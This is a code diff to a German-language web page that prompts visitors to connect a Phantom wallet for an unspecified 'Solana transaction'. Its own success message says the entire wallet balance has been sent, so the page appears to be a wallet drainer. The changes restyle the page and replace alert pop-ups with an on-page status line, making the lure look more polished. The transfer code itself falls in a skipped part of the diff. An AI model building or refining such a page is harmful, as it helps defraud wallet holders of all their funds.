@@ -6,17 +6,29 @@
     <title>Solana Transaktion</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Arial', sans-serif;
             margin: 0;
             padding: 20px;
             display: flex;
             flex-direction: column;
             align-items: center;
-            background-color: #f0f0f0;
+            background-color: #f4f4f4;
         }
         .container {
             text-align: center;
             margin-top: 50px;
+            background-color: #ffffff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 16px;
+            margin-bottom: 30px;
         }
         .button {
             padding: 15px 30px;
@@ -26,10 +38,15 @@
             color: white;
             font-size: 16px;
             cursor: pointer;
-            margin-top: 20px;
+            transition: background-color 0.3s;
         }
         .button:hover {
             background-color: #45a049;
+        }
+        .status {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #888;
         }
     </style>
 </head>
@@ -39,11 +56,15 @@
         <h1>Willkommen bei der Solana Transaktion</h1>
         <p>Verbinden Sie sich mit Ihrer Phantom Wallet, um die Transaktion zu starten.</p>
         <button class="button" id="connectButton">Mit Phantom verbinden</button>
+        <div class="status" id="status"></div>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.40.0/dist/solanaWeb3.min.js"></script>
     <script>
         document.getElementById('connectButton').addEventListener('click', async () => {
+            const statusElement = document.getElementById('status');
+            statusElement.textContent = 'Verbindung wird hergestellt...';
+
             if (window.solana && window.solana.isPhantom) {
                 try {
                     // Verbindung zur Phantom Wallet herstellen
@@ -76,13 +97,16 @@
                     // Transaktion bestätigen
                     await connection.confirmTransaction(signature, 'confirmed');
 
-                    alert('Transaktion erfolgreich! Die gesamte Balance wurde gesendet.');
+                    statusElement.textContent = 'Transaktion erfolgreich! Die gesamte Balance wurde gesendet.';
+                    statusElement.style.color = 'green';
                 } catch (error) {
                     console.error('Fehler:', error);
-                    alert('Fehler bei der Verbindung oder Transaktion.');
+                    statusElement.textContent = 'Fehler bei der Verbindung oder Transaktion.';
+                    statusElement.style.color = 'red';
                 }
             } else {
-                alert('Bitte installieren Sie Phantom Wallet, um diese Funktion zu nutzen.');
+                statusElement.textContent = 'Bitte installieren Sie Phantom Wallet, um diese Funktion zu nutzen.';
+                statusElement.style.color = 'red';
             }
         });
     </script>
